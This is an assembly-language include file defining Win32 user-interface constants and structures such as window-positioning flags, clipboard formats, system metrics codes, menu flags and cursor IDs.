 DFCS_CAPTIONHELP        EQU 0004h
 DFCS_MENUARROW          EQU 0000h
 DFCS_MENUCHECK          EQU 0001h
 DFCS_MENUBULLET         EQU 0002h
 DFCS_MENUARROWRIGHT     EQU 0004h
 DFCS_SCROLLUP           EQU 0000h
 DFCS_SCROLLDOWN         EQU 0001h
 DFCS_SCROLLLEFT         EQU 0002h
 DFCS_SCROLLRIGHT        EQU 0003h
 DFCS_SCROLLCOMBOBOX     EQU 0005h
 DFCS_SCROLLSIZEGRIP     EQU 0008h
 DFCS_SCROLLSIZEGRIPRIGHT EQU 0010h
 DFCS_BUTTONCHECK        EQU 0000h
 DFCS_BUTTONRADIOIMAGE   EQU 0001h
 DFCS_BUTTONRADIOMASK    EQU 0002h
 DFCS_BUTTONRADIO        EQU 0004h
 DFCS_BUTTON3STATE       EQU 0008h
 DFCS_BUTTONPUSH         EQU 0010h
 DFCS_INACTIVE           EQU 0100h
 DFCS_PUSHED             EQU 0200h
 DFCS_CHECKED            EQU 0400h
 DFCS_TRANSPARENT        EQU 0800h
 DFCS_HOT                EQU 1000h
 DFCS_ADJUSTRECT         EQU 2000h
 DFCS_FLAT               EQU 4000h
 DFCS_MONO               EQU 8000h

; flags for DrawCaption

 DC_ACTIVE           EQU 0001h
 DC_SMALLCAP         EQU 0002h
 DC_ICON             EQU 0004h
 DC_TEXT             EQU 0008h
 DC_INBUTTON         EQU 0010h
 DC_GRADIENT         EQU 0020h
 IDANI_OPEN          EQU 1

; Predefined Clipboard Formats

 CF_TEXT             EQU 1
 CF_BITMAP           EQU 2
 CF_METAFILEPICT     EQU 3
 CF_SYLK             EQU 4
 CF_DIF              EQU 5
 CF_TIFF             EQU 6
 CF_OEMTEXT          EQU 7
 CF_DIB              EQU 8
 CF_PALETTE          EQU 9
 CF_PENDATA          EQU 10
 CF_RIFF             EQU 11
 CF_WAVE             EQU 12
 CF_UNICODETEXT      EQU 13
 CF_ENHMETAFILE      EQU 14
 CF_HDROP            EQU 15
 CF_LOCALE           EQU 16
 CF_DIBV5            EQU 17
 CF_MAX              EQU 18
 CF_OWNERDISPLAY     EQU 0080h
 CF_DSPTEXT          EQU 0081h
 CF_DSPBITMAP        EQU 0082h
 CF_DSPMETAFILEPICT  EQU 0083h
 CF_DSPENHMETAFILE   EQU 008Eh
 CF_PRIVATEFIRST     EQU 0200h
 CF_PRIVATELAST      EQU 02FFh
 CF_GDIOBJFIRST      EQU 0300h
 CF_GDIOBJLAST       EQU 03FFh

; Defines for the fVirt field of the Accelerator table structure.

 FVIRTKEY  EQU TRUE
 FNOINVERT EQU 02h
 FSHIFT    EQU 04h
 FCONTROL  EQU 08h
 FALT      EQU 10h

; Owner draw control types

 ODT_MENU        EQU 1
 ODT_LISTBOX     EQU 2
 ODT_COMBOBOX    EQU 3
 ODT_BUTTON      EQU 4
 ODT_STATIC      EQU 5

; Owner draw actions

 ODA_DRAWENTIRE  EQU 0001h
 ODA_SELECT      EQU 0002h
 ODA_FOCUS       EQU 0004h

; Owner draw state

 ODS_SELECTED        EQU 0001h
 ODS_GRAYED          EQU 0002h
 ODS_DISABLED        EQU 0004h
 ODS_CHECKED         EQU 0008h
 ODS_FOCUS           EQU 0010h
 ODS_DEFAULT         EQU 0020h
 ODS_COMBOBOXEDIT    EQU 1000h
 ODS_HOTLIGHT        EQU 0040h
 ODS_INACTIVE        EQU 0080h
 ODS_NOACCEL         EQU 0100h
 ODS_NOFOCUSRECT     EQU 0200h

; PeekMessage() Options

 PM_NOREMOVE         EQU 0000h
 PM_REMOVE           EQU 0001h
 PM_NOYIELD          EQU 0002h
 PM_QS_INPUT         EQU QS_INPUT shl 16
 PM_QS_POSTMESSAGE   EQU (QS_POSTMESSAGE OR QS_HOTKEY OR QS_TIMER) shl 16
 PM_QS_PAINT         EQU QS_PAINT shl 16
 PM_QS_SENDMESSAGE   EQU QS_SENDMESSAGE shl 16

 MOD_ALT             EQU 0001h
 MOD_CONTROL         EQU 0002h
 MOD_SHIFT           EQU 0004h
 MOD_WIN             EQU 0008h

 IDHOT_SNAPWINDOW    EQU (-1)     SHIFT-PRINTSCRN
 IDHOT_SNAPDESKTOP   EQU (-2)     PRINTSCRN

; End Windows Flags

 ENDSESSION_LOGOFF   EQU 80000000h
 EWX_LOGOFF          EQU 0
 EWX_SHUTDOWN        EQU 00000001h
 EWX_REBOOT          EQU 00000002h
 EWX_FORCE           EQU 00000004h
 EWX_POWEROFF        EQU 00000008h
 EWX_FORCEIFHUNG     EQU 00000010h

;Broadcast Special Message Recipient list

 BSM_ALLCOMPONENTS       EQU 00000000h
 BSM_VXDS                EQU 00000001h
 BSM_NETDRIVER           EQU 00000002h
 BSM_INSTALLABLEDRIVERS  EQU 00000004h
 BSM_APPLICATIONS        EQU 00000008h
 BSM_ALLDESKTOPS         EQU 00000010h

;Broadcast Special Message Flags

 BSF_QUERY               EQU 00000001h
 BSF_IGNORECURRENTTASK   EQU 00000002h
 BSF_FLUSHDISK           EQU 00000004h
 BSF_NOHANG              EQU 00000008h
 BSF_POSTMESSAGE         EQU 00000010h
 BSF_FORCEIFHUNG         EQU 00000020h
 BSF_NOTIMEOUTIFNOTHUNG  EQU 00000040h
 BSF_ALLOWSFW            EQU 00000080h

 BROADCAST_QUERY_DENY    EQU 424D5144h  ; Return this value to deny a query.

; RegisterDeviceNotification

 DEVICE_NOTIFY_WINDOW_HANDLE     EQU 00000000h
 DEVICE_NOTIFY_SERVICE_HANDLE    EQU 00000001h

; InSendMessageEx return value

 ISMEX_NOSEND      EQU 00000000h
 ISMEX_SEND        EQU 00000001h
 ISMEX_NOTIFY      EQU 00000002h
 ISMEX_CALLBACK    EQU 00000004h
 ISMEX_REPLIED     EQU 00000008h

 FLASHW_STOP         EQU 0
 FLASHW_CAPTION      EQU 00000001h
 FLASHW_TRAY         EQU 00000002h
 FLASHW_ALL          EQU (FLASHW_CAPTION OR FLASHW_TRAY)
 FLASHW_TIMER        EQU 00000004h
 FLASHW_TIMERNOFG    EQU 0000000Ch

; SetWindowPos Flags

 SWP_NOSIZE          EQU 0001h
 SWP_NOMOVE          EQU 0002h
 SWP_NOZORDER        EQU 0004h
 SWP_NOREDRAW        EQU 0008h
 SWP_NOACTIVATE      EQU 0010h
 SWP_FRAMECHANGED    EQU 0020h ;  The frame changed: send WM_NCCALCSIZE
 SWP_SHOWWINDOW      EQU 0040h
 SWP_HIDEWINDOW      EQU 0080h
 SWP_NOCOPYBITS      EQU 0100h
 SWP_NOOWNERZORDER   EQU 0200h ;  Don't do owner Z ordering
 SWP_NOSENDCHANGING  EQU 0400h ;   Don't send WM_WINDOWPOSCHANGING
 SWP_DRAWFRAME       EQU SWP_FRAMECHANGED
 SWP_NOREPOSITION    EQU SWP_NOOWNERZORDER
 SWP_DEFERERASE      EQU 2000h
 SWP_ASYNCWINDOWPOS  EQU 4000h

 HWND_TOP        EQU  0
 HWND_BOTTOM     EQU  1
 HWND_TOPMOST    EQU -1
 HWND_NOTOPMOST  EQU -2

; Mouse event flags

 MOUSEEVENTF_MOVE        EQU 0001h;  mouse move
 MOUSEEVENTF_LEFTDOWN    EQU 0002h;  left button down
 MOUSEEVENTF_LEFTUP      EQU 0004h;  left button up
 MOUSEEVENTF_RIGHTDOWN   EQU 0008h;  right button down
 MOUSEEVENTF_RIGHTUP     EQU 0010h;  right button up
 MOUSEEVENTF_MIDDLEDOWN  EQU 0020h;  middle button down
 MOUSEEVENTF_MIDDLEUP    EQU 0040h;  middle button up
 MOUSEEVENTF_WHEEL       EQU 0800h;  wheel button rolled
 MOUSEEVENTF_VIRTUALDESK EQU 4000h;  map to entire virtual desktop
 MOUSEEVENTF_ABSOLUTE    EQU 8000h;  absolute move

 INPUT_MOUSE     EQU 0
 INPUT_KEYBOARD  EQU 1
 INPUT_HARDWARE  EQU 2

 MWMO_WAITALL        EQU 0001h
 MWMO_ALERTABLE      EQU 0002h
 MWMO_INPUTAVAILABLE EQU 0004h

;       TBBUTTON

TBBUTTON struc
    iBitmap UINT ?
    idCommand UINT ?
    fsState UCHAR ?
    fsStyle UCHAR ?
    bReserved db 2 dup(?)
    dwData ULONG ?
    iString UINT ?
TBBUTTON ends


; Queue status flags for GetQueueStatus() and MsgWaitForMultipleObjects()

 QS_KEY              EQU 0001h
 QS_MOUSEMOVE        EQU 0002h
 QS_MOUSEBUTTON      EQU 0004h
 QS_POSTMESSAGE      EQU 0008h
 QS_TIMER            EQU 0010h
 QS_PAINT            EQU 0020h
 QS_SENDMESSAGE      EQU 0040h
 QS_HOTKEY           EQU 0080h
 QS_ALLPOSTMESSAGE   EQU 0100h
 QS_MOUSE            EQU (QS_MOUSEMOVE     OR \
                          QS_MOUSEBUTTON)

 QS_INPUT            EQU (QS_MOUSE         OR \
                          QS_KEY)

 QS_ALLEVENTS        EQU (QS_INPUT         OR \
                          QS_POSTMESSAGE   OR \
                          QS_TIMER         OR \
                          QS_PAINT         OR \
                          QS_HOTKEY)

 QS_ALLINPUT         EQU (QS_INPUT         OR \
                          QS_POSTMESSAGE   OR \
                          QS_TIMER         OR \
                          QS_PAINT         OR \
                          QS_HOTKEY        OR \
                          QS_SENDMESSAGE)

; GetSystemMetrics() codes

 SM_CXSCREEN             EQU 0
 SM_CYSCREEN             EQU 1
 SM_CXVSCROLL            EQU 2
 SM_CYHSCROLL            EQU 3
 SM_CYCAPTION            EQU 4
 SM_CXBORDER             EQU 5
 SM_CYBORDER             EQU 6
 SM_CXDLGFRAME           EQU 7
 SM_CYDLGFRAME           EQU 8
 SM_CYVTHUMB             EQU 9
 SM_CXHTHUMB             EQU 10
 SM_CXICON               EQU 11
 SM_CYICON               EQU 12
 SM_CXCURSOR             EQU 13
 SM_CYCURSOR             EQU 14
 SM_CYMENU               EQU 15
 SM_CXFULLSCREEN         EQU 16
 SM_CYFULLSCREEN         EQU 17
 SM_CYKANJIWINDOW        EQU 18
 SM_MOUSEPRESENT         EQU 19
 SM_CYVSCROLL            EQU 20
 SM_CXHSCROLL            EQU 21
 SM_DEBUG                EQU 22
 SM_SWAPBUTTON           EQU 23
 SM_RESERVED1            EQU 24
 SM_RESERVED2            EQU 25
 SM_RESERVED3            EQU 26
 SM_RESERVED4            EQU 27
 SM_CXMIN                EQU 28
 SM_CYMIN                EQU 29
 SM_CXSIZE               EQU 30
 SM_CYSIZE               EQU 31
 SM_CXFRAME              EQU 32
 SM_CYFRAME              EQU 33
 SM_CXMINTRACK           EQU 34
 SM_CYMINTRACK           EQU 35
 SM_CXDOUBLECLK          EQU 36
 SM_CYDOUBLECLK          EQU 37
 SM_CXICONSPACING        EQU 38
 SM_CYICONSPACING        EQU 39
 SM_MENUDROPALIGNMENT    EQU 40
 SM_PENWINDOWS           EQU 41
 SM_DBCSENABLED          EQU 42
 SM_CMOUSEBUTTONS        EQU 43
 SM_CXFIXEDFRAME         EQU SM_CXDLGFRAME   ;win40 name change
 SM_CYFIXEDFRAME         EQU SM_CYDLGFRAME   ;win40 name change
 SM_CXSIZEFRAME          EQU SM_CXFRAME      ;win40 name change
 SM_CYSIZEFRAME          EQU SM_CYFRAME      ;win40 name change
 SM_SECURE               EQU 44
 SM_CXEDGE               EQU 45
 SM_CYEDGE               EQU 46
 SM_CXMINSPACING         EQU 47
 SM_CYMINSPACING         EQU 48
 SM_CXSMICON             EQU 49
 SM_CYSMICON             EQU 50
 SM_CYSMCAPTION          EQU 51
 SM_CXSMSIZE             EQU 52
 SM_CYSMSIZE             EQU 53
 SM_CXMENUSIZE           EQU 54
 SM_CYMENUSIZE           EQU 55
 SM_ARRANGE              EQU 56
 SM_CXMINIMIZED          EQU 57
 SM_CYMINIMIZED          EQU 58
 SM_CXMAXTRACK           EQU 59
 SM_CYMAXTRACK           EQU 60
 SM_CXMAXIMIZED          EQU 61
 SM_CYMAXIMIZED          EQU 62
 SM_NETWORK              EQU 63
 SM_CLEANBOOT            EQU 67
 SM_CXDRAG               EQU 68
 SM_CYDRAG               EQU 69
 SM_SHOWSOUNDS           EQU 70
 SM_CXMENUCHECK          EQU 71 ;   Use instead of GetMenuCheckMarkDimensions()!
 SM_CYMENUCHECK          EQU 72
 SM_SLOWMACHINE          EQU 73
 SM_MIDEASTENABLED       EQU 74
 SM_MOUSEWHEELPRESENT    EQU 75
 SM_XVIRTUALSCREEN       EQU 76
 SM_YVIRTUALSCREEN       EQU 77
 SM_CXVIRTUALSCREEN      EQU 78
 SM_CYVIRTUALSCREEN      EQU 79
 SM_CMONITORS            EQU 80
 SM_SAMEDISPLAYFORMAT    EQU 81
 SM_CMETRICS             EQU 76
 SM_REMOTESESSION        EQU 1000

; return codes for WM_MENUCHAR

 MNC_IGNORE  EQU 0
 MNC_CLOSE   EQU 1
 MNC_EXECUTE EQU 2
 MNC_SELECT  EQU 3

 MNS_NOCHECK         EQU 80000000h
 MNS_MODELESS        EQU 40000000h
 MNS_DRAGDROP        EQU 20000000h
 MNS_AUTODISMISS     EQU 10000000h
 MNS_NOTIFYBYPOS     EQU 08000000h
 MNS_CHECKORBMP      EQU 04000000h

 MIM_MAXHEIGHT               EQU 00000001h
 MIM_BACKGROUND              EQU 00000002h
 MIM_HELPID                  EQU 00000004h
 MIM_MENUDATA                EQU 00000008h
 MIM_STYLE                   EQU 00000010h
 MIM_APPLYTOSUBMENUS         EQU 80000000h

; WM_MENUDRAG return values.

 MND_CONTINUE       EQU 0
 MND_ENDMENU        EQU 1

; WM_MENUGETOBJECT return values

 MNGO_NOINTERFACE     EQU 00000000h
 MNGO_NOERROR         EQU 00000001h

 MIIM_STATE       EQU 00000001h
 MIIM_ID          EQU 00000002h
 MIIM_SUBMENU     EQU 00000004h
 MIIM_CHECKMARKS  EQU 00000008h
 MIIM_TYPE        EQU 00000010h
 MIIM_DATA        EQU 00000020h
 MIIM_STRING      EQU 00000040h
 MIIM_BITMAP      EQU 00000080h
 MIIM_FTYPE       EQU 00000100h

 HBMMENU_CALLBACK            EQU -1
 HBMMENU_SYSTEM              EQU 1
 HBMMENU_MBAR_RESTORE        EQU 2
 HBMMENU_MBAR_MINIMIZE       EQU 3
 HBMMENU_MBAR_CLOSE          EQU 5
 HBMMENU_MBAR_CLOSE_D        EQU 6
 HBMMENU_MBAR_MINIMIZE_D     EQU 7
 HBMMENU_POPUP_CLOSE         EQU 8
 HBMMENU_POPUP_RESTORE       EQU 9
 HBMMENU_POPUP_MAXIMIZE      EQU 10
 HBMMENU_POPUP_MINIMIZE      EQU 11

 GMDI_USEDISABLED    EQU 0001h
 GMDI_GOINTOPOPUPS   EQU 0002h

; Flags for TrackPopupMenu

 TPM_LEFTBUTTON      EQU 0000h
 TPM_RIGHTBUTTON     EQU 0002h
 TPM_LEFTALIGN       EQU 0000h
 TPM_CENTERALIGN     EQU 0004h
 TPM_RIGHTALIGN      EQU 0008h
 TPM_TOPALIGN        EQU 0000h
 TPM_VCENTERALIGN    EQU 0010h
 TPM_BOTTOMALIGN     EQU 0020h
 TPM_HORIZONTAL      EQU 0000h;       Horz alignment matters more
 TPM_VERTICAL        EQU 0040h;       Vert alignment matters more
 TPM_NONOTIFY        EQU 0080h;       Don't send any notification msgs
 TPM_RETURNCMD       EQU 0100h
 TPM_RECURSE         EQU 0001h
 TPM_HORPOSANIMATION EQU 0400h
 TPM_HORNEGANIMATION EQU 0800h
 TPM_VERPOSANIMATION EQU 1000h
 TPM_VERNEGANIMATION EQU 2000h
 TPM_NOANIMATION     EQU 4000h

; DrawText() Format Flags

 DT_TOP                      EQU 00000000h
 DT_LEFT                     EQU 00000000h
 DT_CENTER                   EQU 00000001h
 DT_RIGHT                    EQU 00000002h
 DT_VCENTER                  EQU 00000004h
 DT_BOTTOM                   EQU 00000008h
 DT_WORDBREAK                EQU 00000010h
 DT_SINGLELINE               EQU 00000020h
 DT_EXPANDTABS               EQU 00000040h
 DT_TABSTOP                  EQU 00000080h
 DT_NOCLIP                   EQU 00000100h
 DT_EXTERNALLEADING          EQU 00000200h
 DT_CALCRECT                 EQU 00000400h
 DT_NOPREFIX                 EQU 00000800h
 DT_INTERNAL                 EQU 00001000h
 DT_EDITCONTROL              EQU 00002000h
 DT_PATH_ELLIPSIS            EQU 00004000h
 DT_END_ELLIPSIS             EQU 00008000h
 DT_MODIFYSTRING             EQU 00010000h
 DT_RTLREADING               EQU 00020000h
 DT_WORD_ELLIPSIS            EQU 00040000h
 DT_NOFULLWIDTHCHARBREAK     EQU 00080000h
 DT_HIDEPREFIX               EQU 00100000h
 DT_PREFIXONLY               EQU 00200000h

; Monolithic state-drawing routine
; Image type

 DST_COMPLEX     EQU 0000h
 DST_TEXT        EQU 0001h
 DST_PREFIXTEXT  EQU 0002h
 DST_ICON        EQU 0003h
 DST_BITMAP      EQU 0004h

; State type

 DSS_NORMAL      EQU 0000h
 DSS_UNION       EQU 0010h;   Gray string appearance
 DSS_DISABLED    EQU 0020h
 DSS_MONO        EQU 0080h
 DSS_HIDEPREFIX  EQU 0200h
 DSS_PREFIXONLY  EQU 0400h
 DSS_RIGHT       EQU 8000h

; GetDCEx() flags

 DCX_WINDOW           EQU 00000001h
 DCX_CACHE            EQU 00000002h
 DCX_NORESETATTRS     EQU 00000004h
 DCX_CLIPCHILDREN     EQU 00000008h
 DCX_CLIPSIBLINGS     EQU 00000010h
 DCX_PARENTCLIP       EQU 00000020h
 DCX_EXCLUDERGN       EQU 00000040h
 DCX_INTERSECTRGN     EQU 00000080h
 DCX_EXCLUDEUPDATE    EQU 00000100h
 DCX_INTERSECTUPDATE  EQU 00000200h
 DCX_LOCKWINDOWUPDATE EQU 00000400h
 DCX_VALIDATE         EQU 00200000h

; RedrawWindow() flags

 RDW_INVALIDATE          EQU 0001h
 RDW_INTERNALPAINT       EQU 0002h
 RDW_ERASE               EQU 0004h
 RDW_VALIDATE            EQU 0008h
 RDW_NOINTERNALPAINT     EQU 0010h
 RDW_NOERASE             EQU 0020h
 RDW_NOCHILDREN          EQU 0040h
 RDW_ALLCHILDREN         EQU 0080h
 RDW_UPDATENOW           EQU 0100h
 RDW_ERASENOW            EQU 0200h
 RDW_FRAME               EQU 0400h
 RDW_NOFRAME             EQU 0800h

; EnableScrollBar() flags

 ESB_ENABLE_BOTH     EQU 0000h
 ESB_DISABLE_BOTH    EQU 0003h
 ESB_DISABLE_LEFT    EQU 0001h
 ESB_DISABLE_RIGHT   EQU 0002h
 ESB_DISABLE_UP      EQU 0001h
 ESB_DISABLE_DOWN    EQU 0002h
 ESB_DISABLE_LTUP    EQU ESB_DISABLE_LEFT
 ESB_DISABLE_RTDN    EQU ESB_DISABLE_RIGHT

; MessageBox() Flags

 MB_OK                       EQU 00000000h
 MB_OKCANCEL                 EQU 00000001h
 MB_ABORTRETRYIGNORE         EQU 00000002h
 MB_YESNOCANCEL              EQU 00000003h
 MB_YESNO                    EQU 00000004h
 MB_RETRYCANCEL              EQU 00000005h
 MB_ICONHAND                 EQU 00000010h
 MB_ICONQUESTION             EQU 00000020h
 MB_ICONEXCLAMATION          EQU 00000030h
 MB_ICONASTERISK             EQU 00000040h
 MB_USERICON                 EQU 00000080h
 MB_ICONWARNING              EQU MB_ICONEXCLAMATION
 MB_ICONERROR                EQU MB_ICONHAND
 MB_ICONINFORMATION          EQU MB_ICONASTERISK
 MB_ICONSTOP                 EQU MB_ICONHAND
 MB_DEFBUTTON1               EQU 00000000h
 MB_DEFBUTTON2               EQU 00000100h
 MB_DEFBUTTON3               EQU 00000200h
 MB_DEFBUTTON4               EQU 00000300h
 MB_APPLMODAL                EQU 00000000h
 MB_SYSTEMMODAL              EQU 00001000h
 MB_TASKMODAL                EQU 00002000h
 MB_HELP                     EQU 00004000h
 MB_NOFOCUS                  EQU 00008000h
 MB_SETFOREGROUND            EQU 00010000h
 MB_DEFAULT_DESKTOP_ONLY     EQU 00020000h
 MB_TOPMOST                  EQU 00040000h
 MB_RIGHT                    EQU 00080000h
 MB_RTLREADING               EQU 00100000h
 MB_TYPEMASK                 EQU 0000000Fh
 MB_ICONMASK                 EQU 000000F0h
 MB_DEFMASK                  EQU 00000F00h
 MB_MODEMASK                 EQU 00003000h
 MB_MISCMASK                 EQU 0000C000h

 CWP_ALL             EQU 0000h
 CWP_SKIPINVISIBLE   EQU 0001h
 CWP_SKIPDISABLED    EQU 0002h
 CWP_SKIPTRANSPARENT EQU 0004h

; Shell definitions

 NIM_ADD      EQU   00000000h
 NIM_MODIFY   EQU   00000001h
 NIM_DELETE   EQU   00000002h
 NIM_SETFOCUS EQU   00000003h

 NIF_MESSAGE  EQU   00000001h
 NIF_ICON     EQU   00000002h
 NIF_TIP      EQU   00000004h
 NIF_STATE    EQU   00000008h

 NIS_HIDDEN     EQU 00000001h
 NIS_SHAREDICON EQU 00000002h

NOTIFYICONDATA  STRUC
                cbSize DD SIZE NOTIFYICONDATA
                hWnd   DD 0
                uID    DD 0
                uNIFlags DD 0
                uCallbackMessage DD 0
                hIcon  DD 0
                szTip  DB 64 DUP(0)
NOTIFYICONDATA  ENDS


; Color Types

 CTLCOLOR_MSGBOX         EQU 0
 CTLCOLOR_EDIT           EQU 1
 CTLCOLOR_LISTBOX        EQU 2
 CTLCOLOR_BTN            EQU 3
 CTLCOLOR_DLG            EQU 4
 CTLCOLOR_SCROLLBAR      EQU 5
 CTLCOLOR_STATIC         EQU 6
 CTLCOLOR_MAX            EQU 7
 COLOR_SCROLLBAR         EQU 0
 COLOR_BACKGROUND        EQU 1
 COLOR_ACTIVECAPTION     EQU 2
 COLOR_INACTIVECAPTION   EQU 3
 COLOR_MENU              EQU 4
 COLOR_WINDOW            EQU 5
 COLOR_WINDOWFRAME       EQU 6
 COLOR_MENUTEXT          EQU 7
 COLOR_WINDOWTEXT        EQU 8
 COLOR_CAPTIONTEXT       EQU 9
 COLOR_ACTIVEBORDER      EQU 10
 COLOR_INACTIVEBORDER    EQU 11
 COLOR_APPWORKSPACE      EQU 12
 COLOR_HIGHLIGHT         EQU 13
 COLOR_HIGHLIGHTTEXT     EQU 14
 COLOR_BTNFACE           EQU 15
 COLOR_BTNSHADOW         EQU 16
 COLOR_GRAYTEXT          EQU 17
 COLOR_BTNTEXT           EQU 18
 COLOR_INACTIVECAPTIONTEXT EQU 19
 COLOR_BTNHIGHLIGHT      EQU 20
 COLOR_3DDKSHADOW        EQU 21
 COLOR_3DLIGHT           EQU 22
 COLOR_INFOTEXT          EQU 23
 COLOR_INFOBK            EQU 24
 COLOR_HOTLIGHT          EQU 26
 COLOR_GRADIENTACTIVECAPTION EQU 27
 COLOR_GRADIENTINACTIVECAPTION EQU 28
 COLOR_DESKTOP           EQU COLOR_BACKGROUND
 COLOR_3DFACE            EQU COLOR_BTNFACE
 COLOR_3DSHADOW          EQU COLOR_BTNSHADOW
 COLOR_3DHIGHLIGHT       EQU COLOR_BTNHIGHLIGHT
 COLOR_3DHILIGHT         EQU COLOR_BTNHIGHLIGHT
 COLOR_BTNHILIGHT        EQU COLOR_BTNHIGHLIGHT

; GetWindow() Constants

 GW_HWNDFIRST        EQU 0
 GW_HWNDLAST         EQU 1
 GW_HWNDNEXT         EQU 2
 GW_HWNDPREV         EQU 3
 GW_OWNER            EQU 4
 GW_CHILD            EQU 5
 GW_MAX              EQU 5
 GW_ENABLEDPOPUP     EQU 6

; Menu flags for Add/Check/EnableMenuItem()

 MF_INSERT           EQU 00000000h
 MF_CHANGE           EQU 00000080h
 MF_APPEND           EQU 00000100h
 MF_DELETE           EQU 00000200h
 MF_REMOVE           EQU 00001000h
 MF_BYCOMMAND        EQU 00000000h
 MF_BYPOSITION       EQU 00000400h
 MF_SEPARATOR        EQU 00000800h
 MF_ENABLED          EQU 00000000h
 MF_GRAYED           EQU 00000001h
 MF_DISABLED         EQU 00000002h
 MF_UNCHECKED        EQU 00000000h
 MF_CHECKED          EQU 00000008h
 MF_USECHECKBITMAPS  EQU 00000200h
 MF_STRING           EQU 00000000h
 MF_BITMAP           EQU 00000004h
 MF_OWNERDRAW        EQU 00000100h
 MF_POPUP            EQU 00000010h
 MF_MENUBARBREAK     EQU 00000020h
 MF_MENUBREAK        EQU 00000040h
 MF_UNHILITE         EQU 00000000h
 MF_HILITE           EQU 00000080h
 MF_DEFAULT          EQU 00001000h
 MF_SYSMENU          EQU 00002000h
 MF_HELP             EQU 00004000h
 MF_RIGHTJUSTIFY     EQU 00004000h
 MF_MOUSESELECT      EQU 00008000h

 MFT_STRING          EQU MF_STRING
 MFT_BITMAP          EQU MF_BITMAP
 MFT_MENUBARBREAK    EQU MF_MENUBARBREAK
 MFT_MENUBREAK       EQU MF_MENUBREAK
 MFT_OWNERDRAW       EQU MF_OWNERDRAW
 MFT_RADIOCHECK      EQU 00000200h
 MFT_SEPARATOR       EQU MF_SEPARATOR
 MFT_RIGHTORDER      EQU 00002000h
 MFT_RIGHTJUSTIFY    EQU MF_RIGHTJUSTIFY

; Menu flags for Add/Check/EnableMenuItem()

 MFS_GRAYED          EQU 00000003h
 MFS_DISABLED        EQU MFS_GRAYED
 MFS_CHECKED         EQU MF_CHECKED
 MFS_HILITE          EQU MF_HILITE
 MFS_ENABLED         EQU MF_ENABLED
 MFS_UNCHECKED       EQU MF_UNCHECKED
 MFS_UNHILITE        EQU MF_UNHILITE
 MFS_DEFAULT         EQU MF_DEFAULT

; System Menu Command Values

 SC_SIZE         EQU 0F000h
 SC_MOVE         EQU 0F010h
 SC_MINIMIZE     EQU 0F020h
 SC_MAXIMIZE     EQU 0F030h
 SC_NEXTWINDOW   EQU 0F040h
 SC_PREVWINDOW   EQU 0F050h
 SC_CLOSE        EQU 0F060h
 SC_VSCROLL      EQU 0F070h
 SC_HSCROLL      EQU 0F080h
 SC_MOUSEMENU    EQU 0F090h
 SC_KEYMENU      EQU 0F100h
 SC_ARRANGE      EQU 0F110h
 SC_RESTORE      EQU 0F120h
 SC_TASKLIST     EQU 0F130h
 SC_SCREENSAVE   EQU 0F140h
 SC_HOTKEY       EQU 0F150h
 SC_DEFAULT      EQU 0F160h
 SC_MONITORPOWER EQU 0F170h
 SC_CONTEXTHELP  EQU 0F180h
 SC_SEPARATOR    EQU 0F00Fh
 SC_ICON         EQU SC_MINIMIZE
 SC_ZOOM         EQU SC_MAXIMIZE

; Standard Cursor IDs

 IDC_ARROW           EQU 32512
 IDC_IBEAM           EQU 32513
 IDC_WAIT            EQU 32514
 IDC_CROSS           EQU 32515
 IDC_UPARROW         EQU 32516
 IDC_SIZE            EQU 32640  ;  OBSOLETE: use IDC_SIZEALL
 IDC_ICON            EQU 32641  ;  OBSOLETE: use IDC_ARROW
 IDC_SIZENWSE        EQU 32642
 IDC_SIZENESW        EQU 32643
 IDC_SIZEWE          EQU 32644
 IDC_SIZENS          EQU 32645
 IDC_SIZEALL         EQU 32646
 IDC_NO              EQU 32648 ; not in win3.1
 IDC_HAND            EQU 32649
 IDC_APPSTARTING     EQU 32650 ; not in win3.1
 IDC_HELP            EQU 32651

 IMAGE_BITMAP        EQU 0
 IMAGE_ICON          EQU 1
 IMAGE_CURSOR        EQU 2
 IMAGE_ENHMETAFILE   EQU 3

 LR_DEFAULTCOLOR     EQU 0000h
 LR_MONOCHROME       EQU 0001h
 LR_COLOR            EQU 0002h
 LR_COPYRETURNORG    EQU 0004h
 LR_COPYDELETEORG    EQU 0008h
 LR_LOADFROMFILE     EQU 0010h
 LR_LOADTRANSPARENT  EQU 0020h
 LR_DEFAULTSIZE      EQU 0040h
 LR_VGACOLOR         EQU 0080h
 LR_LOADMAP3DCOLORS  EQU 1000h
 LR_CREATEDIBSECTION EQU 2000h
 LR_COPYFROMRESOURCE EQU 4000h
 LR_SHARED           EQU 8000h

; OEM Resource Ordinal Numbers

 OBM_CLOSE           EQU 32754
 OBM_UPARROW         EQU 32753
 OBM_DNARROW         EQU 32752
 OBM_RGARROW         EQU 32751
 OBM_LFARROW         EQU 32750
 OBM_REDUCE          EQU 32749
 OBM_ZOOM            EQU 32748
 OBM_RESTORE         EQU 32747
 OBM_REDUCED         EQU 32746
 OBM_ZOOMD           EQU 32745
 OBM_RESTORED        EQU 32744
 OBM_UPARROWD        EQU 32743
 OBM_DNARROWD        EQU 32742
 OBM_RGARROWD        EQU 32741
 OBM_LFARROWD        EQU 32740
 OBM_MNARROW         EQU 32739
 OBM_COMBO           EQU 32738
 OBM_UPARROWI        EQU 32737
 OBM_DNARROWI        EQU 32736
 OBM_RGARROWI        EQU 32735
 OBM_LFARROWI        EQU 32734
 OBM_OLD_CLOSE       EQU 32767
 OBM_SIZE            EQU 32766
 OBM_OLD_UPARROW     EQU 32765
 OBM_OLD_DNARROW     EQU 32764
 OBM_OLD_RGARROW     EQU 32763
 OBM_OLD_LFARROW     EQU 32762
 OBM_BTSIZE          EQU 32761
 OBM_CHECK           EQU 32760
 OBM_CHECKBOXES      EQU 32759
 OBM_BTNCORNERS      EQU 32758
 OBM_OLD_REDUCE      EQU 32757
 OBM_OLD_ZOOM        EQU 32756
 OBM_OLD_RESTORE     EQU 32755

 OCR_NORMAL          EQU 32512
 OCR_IBEAM           EQU 32513
 OCR_WAIT            EQU 32514
 OCR_CROSS           EQU 32515
 OCR_UP              EQU 32516
 OCR_SIZE            EQU 32640 ;   OBSOLETE: use OCR_SIZEALL
 OCR_ICON            EQU 32641 ;   OBSOLETE: use OCR_NORMAL
 OCR_SIZENWSE        EQU 32642
 OCR_SIZENESW        EQU 32643
 OCR_SIZEWE          EQU 32644
 OCR_SIZENS          EQU 32645
 OCR_SIZEALL         EQU 32646
 OCR_ICOCUR          EQU 32647 ;   OBSOLETE: use OIC_WINLOGO
 OCR_NO              EQU 32648
 OCR_HAND            EQU 32649
 OCR_APPSTARTING     EQU 32650
 OIC_SAMPLE          EQU 32512
 OIC_HAND            EQU 32513
 OIC_QUES            EQU 32514
